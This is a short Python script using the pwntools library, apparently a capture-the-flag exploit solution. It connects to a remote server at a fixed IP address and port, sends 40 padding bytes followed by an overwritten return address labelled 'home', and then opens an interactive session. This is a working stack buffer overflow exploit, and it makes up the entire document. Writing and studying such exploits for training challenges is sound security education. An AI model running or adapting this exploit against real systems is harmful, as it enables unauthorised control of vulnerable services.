#! /usr/bin/python
# -*- coding: utf-8 -*-
# By : vagrant
# Email : finn79426@gmail.com
from pwn import *

host = "140.110.112.31"
port = 6126
r = remote(host, port)

context.arch = "amd64"

r.recvuntil("?")

payload = "a"*40
home = 0x00000000004006c6

payload += flat([home])
r.sendline(payload)
r.interactive()

